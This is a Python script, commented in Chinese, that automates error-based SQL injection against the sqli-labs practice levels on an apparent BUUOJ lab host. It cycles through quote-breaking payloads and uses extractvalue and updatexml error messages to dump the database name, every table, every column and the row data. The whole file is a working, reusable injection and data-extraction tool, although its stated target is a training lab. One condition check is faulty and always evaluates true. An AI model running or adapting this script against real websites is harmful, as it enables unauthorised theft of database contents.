import re
import requests

# Less-1: ?id=1'
# Less-2: ?id=1
# https://blog.csdn.net/qq_52072846/article/details/123003207
# https://blog.csdn.net/l2872253606/article/details/124423275
# 前提：判断有注入点
# 常见的注入点payload.
payloads = ["?id=1'", '?id=1"', "?id=1')", '?id=1")', "?id=1)","?id=1"]


# 获取数据库名
def GetDBName(url):
    db_name = ''
    for payload in payloads:
        test = url + payload + " and extractvalue (1,concat(0x7e,database()))--+"
        # 请求
        req = requests.get(test)
        req.encoding = 'gbk'
        # 得到网页的html
        html = req.text
        text = str(html)
        try:
            if 'syntax' or 'error' in text:
                # 通过正则表达式得到结果
                db_name = re.search("~\w{1,30}'", text).group()[1:-1]
        except:
            # 由于payload不正确而没有成功，则pass
            pass
    return db_name


# 获取数据库表函数
def GetDBTables(url, table_schema):
    table_names = []
    # extractvalue()函数所能显示的错误信息最大长度为32。如果错误信息超过了最大长度，有可能导致显示不全。因此,需要借助limit来做分行显示
    # 一次得到一个表
    for payload in payloads:
        for num in range(20):
            test = url + payload + " and updatexml(11,concat(0x7e,(select table_name from information_schema.tables " \
                                   f"where table_schema= '{table_schema}' " \
                                   f"limit {num},1),0x7e),11)--+ "
            # 请求
            # print(test)
            con = requests.get(test)
            con.encoding = 'gbk'
            # 得到网页的html
            html = con.text
            text = str(html)
            if 'syntax' or 'error' in text:
                table_name = re.search("~\w{1,30}~", text)
                if table_name is None:
                    # 由于payload无效/num超过现有个数而没有结果，则break
                    break
                else:
                    # 保存结果
                    name = table_name.group()[1:-1]
                    table_names.append(name)
    return table_names


# 获取数据库表的字段函数
def GetDBColumns(url, db_name, table_name):
    column_names = []
    for payload in payloads:
        for num in range(20):
            test = url + payload + " and updatexml(11,concat(0x7e,(select column_name from " \
                                   f"information_schema.columns where table_schema='{db_name}' and table_name='{table_name}' " \
                                   f"limit {num},1),0x7e),11)--+ "
            # 请求
            # print(test)
            con = requests.get(test)
            # print(con.url)
            con.encoding = 'gbk'
            html = con.text
            # 得到网页的html
            text = str(html)
            if 'syntax' or 'error' in text:
                column_name = re.search("~\w{1,30}~", text)
                if column_name is None:
                    # 由于payload无效/num超过现有个数而没有结果，则break
                    break
                else:
                    # 保存结果
                    name = column_name.group()[1:-1]
                    column_names.append(name)
    return column_names


# 获取表数据函数
def GetDBData(url, db_name, table_name, colunm_name):
    colunm_values = {}
    colunm_values[colunm_name] = []
    for payload in payloads:
        for num in range(20):
            test = url + payload + f" and updatexml(1,concat(0x7e,(select {colunm_name} from {db_name}.{table_name} limit {num},1),0x7e),1)--+ "
            # 请求
            # print(test)
            con = requests.get(test)
            con.encoding = 'gbk'
            # 得到网页的html
            html = con.text
            text = str(html)
            if 'syntax' or 'error' in text:
                column_value = re.search('~\S{1,32}~', text)
                if column_value is None:
                    # 由于payload无效/num超过现有个数而没有结果，则break
                    break
                else:
                    value = column_value.group()[1:-1]
                    colunm_values[colunm_name].append(value)
    return colunm_values


def StartSqli(url):
    db_name = GetDBName(url)
    print(str(db_name))
    table_names = GetDBTables(url, db_name)
    print('-- ' + db_name + ':' + str(table_names))
    for table_name in table_names:
        column_names = GetDBColumns(url, db_name, table_name)
        print('---- ' + table_name + ':' + str(column_names))
        for column_name in column_names:
            column_values = GetDBData(url, db_name, table_name, column_name)
            print('------' + column_name + ':' + str(column_values[column_name]))


if __name__ == '__main__':
    url = "http://1d7b87a0-abb7-4168-909e-7ac77d06f8e4.node4.buuoj.cn/Less-2/"
    StartSqli(url)
